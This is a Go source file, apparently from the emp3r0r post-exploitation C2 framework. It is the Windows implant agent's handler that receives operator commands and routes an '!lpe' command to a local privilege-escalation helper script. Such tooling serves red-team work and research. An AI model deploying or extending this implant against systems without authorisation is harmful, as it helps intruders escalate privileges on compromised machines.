//go:build windows
// +build windows

package agent

import (
	"fmt"
	"log"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/spf13/pflag"
)

func platformC2CommandsHandler(cmdSlice []string) (out string) {
	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	switch cmdSlice[0] {
	case emp3r0r_data.C2CmdLPE:
		// LPE helper
		// !lpe --script_name script_name
		scriptName := flags.StringP("script_name", "s", "", "Script name")
		flags.Parse(cmdSlice[1:])
		if *scriptName == "" {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Print(out)
			return
		}
		out = runLPEHelper(*scriptName)
		return
	}

	return fmt.Sprintf("Unknown command %v", cmdSlice)
}
